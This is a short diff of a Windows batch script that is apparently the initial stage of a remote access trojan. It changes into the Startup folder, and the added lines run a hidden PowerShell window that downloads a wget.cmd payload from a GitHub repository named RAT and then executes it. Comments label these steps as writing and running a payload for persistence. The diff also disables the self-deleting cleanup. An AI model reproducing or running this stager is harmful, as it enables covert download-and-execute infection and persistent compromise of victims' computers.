@@ -8,13 +8,13 @@ cd "%STARTUP%"
 
 @rem TODO build out stage2
 @REM write payload to startup
-powershell Start-Process powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'link downlaodfile' -OutFile wget.cmd' "
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/birbalkr/RAT/master/files/wget.cmd -OutFile wget.cmd"
 
 @rem run playload
-powershell ./wget.cmd
+powershell .\wget.cmd
 
 @REM back into initial loc
-cd "%INITIALPATH%"
+@REM cd "%INITIALPATH%"
 
 @rem del initial.cmd
-del initial.cmd
+@REM del initial.cmd
